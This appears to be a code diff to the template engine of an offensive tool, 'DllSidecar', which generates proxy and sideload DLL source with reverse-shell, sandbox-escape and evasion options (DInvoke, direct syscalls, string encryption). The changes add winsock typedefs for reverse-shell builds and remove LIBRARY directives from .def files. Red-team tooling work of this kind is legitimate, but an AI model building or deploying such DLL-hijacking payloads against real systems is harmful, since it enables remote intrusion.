@@ -172,6 +172,8 @@ public static class TemplateEngine
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
+        if (config.Payload == PayloadType.ReverseShell && !config.DInvoke)
+            EmitReverseShellTypedefs(sb);
         sb.AppendLine();
 
         // Header
@@ -265,6 +267,14 @@ public static class TemplateEngine
         bool isX64 = analysis.Arch == "x64";
 
         var sb = new StringBuilder();
+        // Canonical header order — winsock2.h MUST precede windows.h. See the
+        // matching note in GenerateProxy for the full rationale.
+        if (config.Payload == PayloadType.ReverseShell)
+        {
+            sb.AppendLine("#define WIN32_LEAN_AND_MEAN");
+            sb.AppendLine("#include <winsock2.h>");
+            sb.AppendLine("#include <ws2tcpip.h>");
+        }
         sb.AppendLine("#include <windows.h>");
         sb.AppendLine("#include <stdio.h>");
         if (config.Payload == PayloadType.SandboxEscape) sb.AppendLine("#include <tlhelp32.h>");
@@ -282,6 +292,11 @@ public static class TemplateEngine
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
+        // Non-DInvoke ReverseShell paths resolve via LoadLibraryA + GetProcAddress
+        // and need the WS2_32 / CreateProcessA function-pointer types declared
+        // locally — dinvoke.h's gated copies are not visible without DInvoke.
+        if (config.Payload == PayloadType.ReverseShell && !config.DInvoke)
+            EmitReverseShellTypedefs(sb);
         sb.AppendLine();
 
         sb.AppendLine($"/* === DllSidecar ProxyDll (pure-forwarder mode) === */");
@@ -338,10 +353,36 @@ public static class TemplateEngine
     /// forwarder syntax (line 3 syntax error). In practice, hosts always import
     /// by name; ordinal-only slots in system DLLs tend to be internal helpers.
     /// </summary>
+    /// <summary>
+    /// WS2_32 + kernel32 function-pointer typedefs used by the reverse-shell
+    /// payload's non-DInvoke resolution paths (Plain and EncryptStrings). The
+    /// DInvoke path picks these up from dinvoke.h instead — dinvoke.h gates them
+    /// behind _WINSOCK2API_, so they only appear there once <winsock2.h> has
+    /// been pulled. Non-DInvoke builds never include dinvoke.h, so the function-
+    /// pointer types have to be declared in the generated .c directly or the
+    /// later `fn_WSAStartup pStartup = ...` casts fail to compile.
+    /// </summary>
+    private static void EmitReverseShellTypedefs(StringBuilder sb)
+    {
+        sb.AppendLine();
+        sb.AppendLine("/* Reverse-shell function-pointer typedefs (no DInvoke). */");
+        sb.AppendLine("typedef int     (WINAPI *fn_WSAStartup)(WORD, LPWSADATA);");
+        sb.AppendLine("typedef SOCKET  (WINAPI *fn_WSASocketW)(int, int, int, LPVOID, GROUP, DWORD);");
+        sb.AppendLine("typedef int     (WINAPI *fn_connect)(SOCKET, const struct sockaddr*, int);");
+        sb.AppendLine("typedef int     (WINAPI *fn_closesocket)(SOCKET);");
+        sb.AppendLine("typedef BOOL    (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,");
+        sb.AppendLine("                    LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR,");
+        sb.AppendLine("                    LPSTARTUPINFOA, LPPROCESS_INFORMATION);");
+    }
+
     private static string GenerateForwarderDefFile(PeAnalysis analysis, List<ExportEntry> exports, string origBase)
     {
         var sb = new StringBuilder();
-        sb.AppendLine($"LIBRARY {Path.GetFileNameWithoutExtension(analysis.Filename)}");
+        // No LIBRARY directive: MinGW ld's .def parser reserves some basenames as
+        // keywords (VERSION, DESCRIPTION, STACKSIZE, …), and `LIBRARY VERSION`
+        // collides with the `VERSION major.minor` directive — file format not
+        // recognized, syntax error on line 1. The DLL name is already pinned by
+        // the linker's `-o filename.dll` flag, so the directive is redundant.
         sb.AppendLine("EXPORTS");
 
         int skippedOrdinals = 0;
@@ -387,6 +428,8 @@ public static class TemplateEngine
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
+        if (config.Payload == PayloadType.ReverseShell && !config.DInvoke)
+            EmitReverseShellTypedefs(sb);
         sb.AppendLine();
 
         sb.AppendLine($"/* === DllSidecar SideloadDll (stub mode) === */");
@@ -440,9 +483,8 @@ public static class TemplateEngine
         var baseName = Path.GetFileNameWithoutExtension(analysis.Filename);
         var srcName = $"sideload_{baseName}";
 
-        // Def file with stubs
+        // Def file with stubs — no LIBRARY directive (see GenerateForwarderDefFile).
         var defSb = new StringBuilder();
-        defSb.AppendLine($"LIBRARY {baseName}");
         defSb.AppendLine("EXPORTS");
         for (int i = 0; i < exports.Count; i++)
         {
@@ -1058,7 +1100,7 @@ public static class TemplateEngine
     private static string GenerateDefFile(PeAnalysis analysis, List<ExportEntry> exports, bool useTrampolines)
     {
         var sb = new StringBuilder();
-        sb.AppendLine($"LIBRARY {Path.GetFileNameWithoutExtension(analysis.Filename)}");
+        // No LIBRARY directive (see GenerateForwarderDefFile for the keyword-collision rationale).
         sb.AppendLine("EXPORTS");
 
         for (int i = 0; i < exports.Count; i++)
